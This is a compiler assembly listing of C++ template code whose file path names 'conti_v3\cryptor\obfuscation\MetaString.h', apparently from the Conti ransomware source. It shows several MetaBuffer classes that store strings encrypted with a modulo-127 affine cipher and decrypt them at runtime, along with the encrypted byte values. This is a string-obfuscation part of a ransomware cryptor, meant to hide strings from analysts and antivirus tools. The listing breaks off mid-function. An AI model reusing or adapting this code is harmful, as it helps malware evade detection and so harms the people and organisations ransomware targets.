?decrypt@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 1a 00 00
	00		 mov	 r11d, 26
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 40	 sub	 ecx, 64			; 00000040H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 22	 imul	 r8d, ecx, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 50	 mov	 BYTE PTR [rcx+1], 80	; 00000050H
  00007	c6 41 02 40	 mov	 BYTE PTR [rcx+2], 64	; 00000040H
  0000b	c6 41 03 2c	 mov	 BYTE PTR [rcx+3], 44	; 0000002cH
  0000f	c6 41 04 40	 mov	 BYTE PTR [rcx+4], 64	; 00000040H
  00013	c6 41 05 7b	 mov	 BYTE PTR [rcx+5], 123	; 0000007bH
  00017	c6 41 06 40	 mov	 BYTE PTR [rcx+6], 64	; 00000040H
  0001b	c6 41 07 6c	 mov	 BYTE PTR [rcx+7], 108	; 0000006cH
  0001f	c6 41 08 40	 mov	 BYTE PTR [rcx+8], 64	; 00000040H
  00023	c6 41 09 13	 mov	 BYTE PTR [rcx+9], 19
  00027	c6 41 0a 40	 mov	 BYTE PTR [rcx+10], 64	; 00000040H
  0002b	c6 41 0b 6c	 mov	 BYTE PTR [rcx+11], 108	; 0000006cH
  0002f	c6 41 0c 40	 mov	 BYTE PTR [rcx+12], 64	; 00000040H
  00033	c6 41 0d 70	 mov	 BYTE PTR [rcx+13], 112	; 00000070H
  00037	c6 41 0e 40	 mov	 BYTE PTR [rcx+14], 64	; 00000040H
  0003b	c6 41 0f 7b	 mov	 BYTE PTR [rcx+15], 123	; 0000007bH
  0003f	c6 41 10 40	 mov	 BYTE PTR [rcx+16], 64	; 00000040H
  00043	c6 41 11 1c	 mov	 BYTE PTR [rcx+17], 28
  00047	c6 41 12 40	 mov	 BYTE PTR [rcx+18], 64	; 00000040H
  0004b	c6 41 13 33	 mov	 BYTE PTR [rcx+19], 51	; 00000033H
  0004f	c6 41 14 40	 mov	 BYTE PTR [rcx+20], 64	; 00000040H
  00053	c6 41 15 1a	 mov	 BYTE PTR [rcx+21], 26
  00057	c6 41 16 40	 mov	 BYTE PTR [rcx+22], 64	; 00000040H
  0005b	c6 41 17 00	 mov	 BYTE PTR [rcx+23], 0
  0005f	c6 41 18 40	 mov	 BYTE PTR [rcx+24], 64	; 00000040H
  00063	c6 41 19 40	 mov	 BYTE PTR [rcx+25], 64	; 00000040H
  00067	c6 41 1a 40	 mov	 BYTE PTR [rcx+26], 64	; 00000040H
  0006b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0006f	48 8b c1	 mov	 rax, rcx
  00072	c3		 ret	 0
??0?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 7d	 sub	 ecx, 125		; 0000007dH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1c	 imul	 r8d, ecx, 28

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6f	 mov	 BYTE PTR [rcx+1], 111	; 0000006fH
  00007	c6 41 02 7d	 mov	 BYTE PTR [rcx+2], 125	; 0000007dH
  0000b	c6 41 03 26	 mov	 BYTE PTR [rcx+3], 38	; 00000026H
  0000f	c6 41 04 7d	 mov	 BYTE PTR [rcx+4], 125	; 0000007dH
  00013	c6 41 05 2b	 mov	 BYTE PTR [rcx+5], 43	; 0000002bH
  00017	c6 41 06 7d	 mov	 BYTE PTR [rcx+6], 125	; 0000007dH
  0001b	c6 41 07 4f	 mov	 BYTE PTR [rcx+7], 79	; 0000004fH
  0001f	c6 41 08 7d	 mov	 BYTE PTR [rcx+8], 125	; 0000007dH
  00023	c6 41 09 41	 mov	 BYTE PTR [rcx+9], 65	; 00000041H
  00027	c6 41 0a 7d	 mov	 BYTE PTR [rcx+10], 125	; 0000007dH
  0002b	c6 41 0b 7d	 mov	 BYTE PTR [rcx+11], 125	; 0000007dH
  0002f	c6 41 0c 7d	 mov	 BYTE PTR [rcx+12], 125	; 0000007dH
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6b		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 04	 sub	 ecx, 4

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00034	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00037	41 f7 e8	 imul	 r8d
  0003a	41 03 d0	 add	 edx, r8d
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	44 2b c0	 sub	 r8d, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00056	41 f7 e8	 imul	 r8d
  00059	41 03 d0	 add	 edx, r8d
  0005c	c1 fa 06	 sar	 edx, 6
  0005f	8b c2		 mov	 eax, edx
  00061	c1 e8 1f	 shr	 eax, 31
  00064	03 d0		 add	 edx, eax
  00066	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00069	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006c	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00070	49 83 eb 01	 sub	 r11, 1
  00074	75 aa		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00076	49 8b c1	 mov	 rax, r9
  00079	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 29	 mov	 BYTE PTR [rcx+1], 41	; 00000029H
  00007	c6 41 02 04	 mov	 BYTE PTR [rcx+2], 4
  0000b	c6 41 03 67	 mov	 BYTE PTR [rcx+3], 103	; 00000067H
  0000f	c6 41 04 04	 mov	 BYTE PTR [rcx+4], 4
  00013	c6 41 05 35	 mov	 BYTE PTR [rcx+5], 53	; 00000035H
  00017	c6 41 06 04	 mov	 BYTE PTR [rcx+6], 4
  0001b	c6 41 07 42	 mov	 BYTE PTR [rcx+7], 66	; 00000042H
  0001f	c6 41 08 04	 mov	 BYTE PTR [rcx+8], 4
  00023	c6 41 09 04	 mov	 BYTE PTR [rcx+9], 4
  00027	c6 41 0a 04	 mov	 BYTE PTR [rcx+10], 4
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 25	 sub	 ecx, 37			; 00000025H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 29	 imul	 r8d, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 2b	 mov	 BYTE PTR [rcx+1], 43	; 0000002bH
  00007	c6 41 02 25	 mov	 BYTE PTR [rcx+2], 37	; 00000025H
  0000b	c6 41 03 75	 mov	 BYTE PTR [rcx+3], 117	; 00000075H
  0000f	c6 41 04 25	 mov	 BYTE PTR [rcx+4], 37	; 00000025H
  00013	c6 41 05 12	 mov	 BYTE PTR [rcx+5], 18
  00017	c6 41 06 25	 mov	 BYTE PTR [rcx+6], 37	; 00000025H
  0001b	c6 41 07 12	 mov	 BYTE PTR [rcx+7], 18
  0001f	c6 41 08 25	 mov	 BYTE PTR [rcx+8], 37	; 00000025H
  00023	c6 41 09 4d	 mov	 BYTE PTR [rcx+9], 77	; 0000004dH
  00027	c6 41 0a 25	 mov	 BYTE PTR [rcx+10], 37	; 00000025H
  0002b	c6 41 0b 25	 mov	 BYTE PTR [rcx+11], 37	; 00000025H
  0002f	c6 41 0c 25	 mov	 BYTE PTR [rcx+12], 37	; 00000025H
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 08 00 00
	00		 mov	 r10d, 8
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

